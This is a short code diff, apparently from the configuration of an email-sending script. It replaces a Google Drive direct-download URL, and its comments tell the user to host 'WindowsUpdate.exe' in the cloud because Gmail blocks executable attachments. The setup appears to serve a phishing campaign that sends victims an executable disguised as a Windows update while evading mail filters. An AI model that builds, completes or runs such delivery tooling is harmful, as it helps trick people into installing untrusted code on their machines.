@@ -22,7 +22,7 @@ USE_GMAIL = True
 
 # OPTION 1: Cloud Storage Direct Download Link (RECOMMENDED)
 # Upload WindowsUpdate.exe to Google Drive/Dropbox and paste direct download link here:
-DIRECT_DOWNLOAD_URL = "https://drive.google.com/uc?export=download&id=1wPgx95i32spQPJsPiSfeYT8Iq0-q0M_Z"
+DIRECT_DOWNLOAD_URL = "https://drive.google.com/uc?export=download&id=1bseHSQZRroY-khNIDvXmNQA2-pffoBht"
 
 # OPTION 2: Attach EXE directly (WILL BE BLOCKED - Gmail doesn't allow exe attachments)
 ATTACH_EXE_DIRECTLY = False  # Disabled - using cloud storage instead
